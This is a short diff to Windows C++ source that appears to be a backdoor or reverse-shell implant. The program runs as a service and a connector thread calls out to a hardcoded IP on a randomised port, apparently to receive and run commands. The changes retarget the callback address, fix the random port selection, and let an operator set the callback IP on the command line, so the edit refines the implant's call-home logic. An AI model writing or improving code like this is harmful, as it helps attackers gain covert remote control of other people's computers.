@@ -6,6 +6,7 @@
 #include <windows.h>
 #include <time.h>
 #include <string>
+#include <atlstr.h>
 
 using namespace std;
 
@@ -197,7 +198,7 @@ void exec2(cmdcall *p)
 	return;
 }
 
-std::string ip = "10.5.2.1";
+std::string ip = "10.1.215.73";
 std::string pwd = "c:\\";
 bool running = true;
 
@@ -238,6 +239,7 @@ void connector(void *params)
 			continue;
 		}
 
+		srand(time(NULL));
 		int port = 58800 + (rand() % 250);
 		addr.sin_family = AF_INET;
 		addr.sin_port = htons(port);
@@ -361,6 +363,15 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 	};
 
 	StartServiceCtrlDispatcher(DispatchTable);
+
+	LPWSTR *cmdLineArgs;
+	int numArgs;
+
+	cmdLineArgs = CommandLineToArgvW(GetCommandLineW(), &numArgs);
+	if (numArgs == 2)
+	{
+		ip = CW2A(cmdLineArgs[1]);
+	}
 
 	while (!wasService)
 	{
